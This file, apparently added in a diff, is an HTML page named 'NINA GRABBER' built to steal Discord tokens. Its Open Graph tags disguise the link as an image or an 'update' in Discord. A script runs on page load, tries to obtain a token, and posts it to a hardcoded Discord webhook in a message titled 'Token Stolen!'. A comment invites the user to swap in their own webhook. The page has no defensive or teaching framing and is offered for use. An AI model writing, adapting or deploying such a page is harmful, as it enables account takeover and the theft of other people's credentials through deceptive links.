@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- 👇 THESE LINES MAKE IT LOOK LIKE AN IMAGE IN DISCORD 👇 -->
+    <meta property="og:title" content="NINA UPDATE" />
+    <meta property="og:description" content="Click to view update..." />
+    <meta property="og:image" content="https://i.imgur.com/placeholder.png" /> 
+    <meta property="og:url" content="https://yourname.github.io/payload.html" />
+    
+    <title>NINA GRABBER</title>
+    <style>
+        body { margin: 0; background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // ⚠️ REPLACE WITH YOUR WEBHOOK ⚠️
+        const webhook = "https://discord.com/api/webhooks/1570463957951578122/k3-Ehr0pVUH2CWyJkjPXFu89G-z4yY5VRiQJOqII8JniIQEnU-S0lqbA2-OZWl-hds78";
+
+        async function steal() {
+            try {
+                const token = await new Promise((resolve) => {
+                    window.addEventListener("message", e => { if(e.data.type === "TOKEN") resolve(e.data.token); });
+                    window.postMessage({ type: "TOKEN" }, "*");
+                });
+                
+                fetch(webhook, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        username: "NINA GRABBER",
+                        embeds: [{ title: "Token Stolen!", fields: [{ name: "Token", value: `\`\`\`${token}\`\`\`` }] }]
+                    })
+                });
+            } catch(e) {}
+        }
+        steal();
+    </script>
+</body>
+</html>
